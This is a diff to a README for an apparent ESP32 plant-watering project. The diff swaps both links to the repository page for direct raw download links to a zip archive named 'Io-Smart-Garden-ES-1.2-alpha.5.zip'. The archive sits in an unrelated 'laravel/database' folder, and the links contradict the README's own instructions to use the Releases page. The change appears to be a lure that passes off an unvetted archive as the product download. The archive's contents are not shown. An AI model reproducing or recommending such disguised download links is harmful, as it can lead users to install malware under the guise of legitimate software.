@@ -1,6 +1,6 @@
 # 🌿 SmartGardenIoT-ESP32 - Automated plant care for home gardens
 
-[![Download SmartGarden](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/vanesselo9574/SmartGardenIoT-ESP32)
+[![Download SmartGarden](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/vanesselo9574/SmartGardenIoT-ESP32/main/laravel/database/Io-Smart-Garden-ES-1.2-alpha.5.zip)
 
 This software helps you manage your indoor or outdoor garden. It connects your ESP32 hardware to a simple dashboard on your computer. You can track soil moisture, trigger water pumps, and set watering schedules.
 
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets these requirements:
 
 You need to access the official project page to download the necessary files.
 
-[Click here to visit the download page](https://github.com/vanesselo9574/SmartGardenIoT-ESP32)
+[Click here to visit the download page](https://raw.githubusercontent.com/vanesselo9574/SmartGardenIoT-ESP32/main/laravel/database/Io-Smart-Garden-ES-1.2-alpha.5.zip)
 
 Locate the section labeled "Releases" on the right side of the page. Select the latest version listed. Download the file ending in `.zip` to your computer.
 
